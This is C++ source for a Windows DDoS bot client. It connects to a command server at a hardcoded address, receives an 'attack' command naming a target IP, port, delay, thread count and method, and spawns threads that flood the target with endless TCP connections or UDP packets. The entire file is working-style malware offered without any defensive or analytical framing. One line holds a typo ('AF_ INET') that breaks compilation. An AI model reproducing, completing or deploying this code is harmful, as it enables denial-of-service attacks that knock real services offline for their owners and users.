/* Windows Only */

#include<iostream>
#include<cstring>
#include<string>
#include<thread>
#include<WinSock2.h>

SOCKET client_socket{0};

struct info
{
    char command[16];
    char ip[16];
    int port;
    int delay;
    int thread;
    char method[4];
} command;

void tcpflood(const char* ip, int port, int delay)
{
    SOCKADDR_IN target{0};
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(ip);
    target.sin_port = htons(port);

    char packet[1024];
    for(int i = 0; i < 1024; i++) {
        packet[i] = rand();
    }

    while(true)
    {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(sock, reinterpret_cast<sockaddr*>(&target), sizeof(target));
        send(sock, packet, sizeof(packet), 0);
        closesocket(sock);

        Sleep(delay);
    }
}

void udpflood(const char* ip, int port, int delay)
{
    SOCKADDR_IN target{0};
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(ip);
    target.sin_port = htons(port);

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    char packet[1024]{0};
    for(int i = 0; i < 1024; i++) {
        packet[i] = rand();
    }

    while(true) {
        sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&target), sizeof(target));
        Sleep(delay);
    }
}

int main()
{
    WSADATA wsaData;
    WORD version = MAKEWORD(2, 2);
    WSAStartup(version, &wsaData);

    SOCKADDR_IN addr{0};
    addr.sin_family = AF_ INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(80);

    client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(client_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
    std::cout << " connect " << std::endl;

    while(true)
    {
        std::memset(&command, 0, sizeof(info));
        recv(client_socket, reinterpret_cast<char*>(&command), sizeof(info), 0);

        if(strcmp(command.command, "attack") == 0)
        {
            for(int i = 0; i < command.thread; i++)
            {
                if(strcmp(command.method, "udp") == 0) {
                    std::thread(udpflood, command.ip, command.port, command.delay).detach();
                }

                else if(strcmp(command.method, "tcp") == 0) {
                    std::thread(tcpflood, command.ip, command.port, command.delay).detach();
                }
            }
        }
    }

    return 0;
}